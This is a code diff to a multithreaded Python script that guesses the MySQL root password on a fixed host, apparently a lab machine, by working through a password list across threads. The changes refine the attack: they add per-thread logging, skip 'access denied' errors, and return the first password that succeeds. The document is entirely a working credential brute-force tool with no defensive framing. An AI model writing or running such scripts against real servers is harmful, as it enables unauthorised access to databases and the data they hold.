@@ -2,6 +2,7 @@ import mysql.connector
 import numpy as np
 import concurrent.futures
 import traceback
+import threading
 
 NO_THREADS = 10
 
@@ -9,19 +10,23 @@ NO_THREADS = 10
 def try_connection(potential_array):
     for val in potential_array:
         val = val.rstrip()
-        print("Try with val: {}".format(val))
+        print("[{}] Try with val: {}".format(threading.current_thread().native_id, val))
         try:
             connector = mysql.connector.connect(user="root", database="information_schema", host="192.168.230.130",
-                                                password=val, connection_timeout=60)
+                                                password=val)
             connector.close()
-        except socket.timeout as err:
-            print("timeout {}".format(err))
-            traceback.print_exc()
-            continue
-        print("Connector: {}".format(connector))
-        if connector:
-            print("Found credentials: root with pass: {}".format(val))
-            return connector
+            print(
+                "[{}]: successfully connected with user root and pass: {}".format(threading.current_thread().native_id,
+                                                                                  val))
+            # TODO: send SIGTERM to others threads.
+            return val
+        except BaseException as exc:
+            if exc.errno == 1045:
+                # Access denied
+                continue
+            if exc.errno == 2055:
+                print("[{}]: lost connection with server; timed out")
+                # TODO: try with this value later.
     return -1
 
 
@@ -43,7 +48,7 @@ def main():
 
     print("Numbers of lists: {}".format(len(arrayOfLists)))
     with concurrent.futures.ThreadPoolExecutor() as executor:
-        results = executor.map(try_connection, arrayOfLists)
+        executor.map(try_connection, arrayOfLists)
 
 
 if __name__ == '__main__':
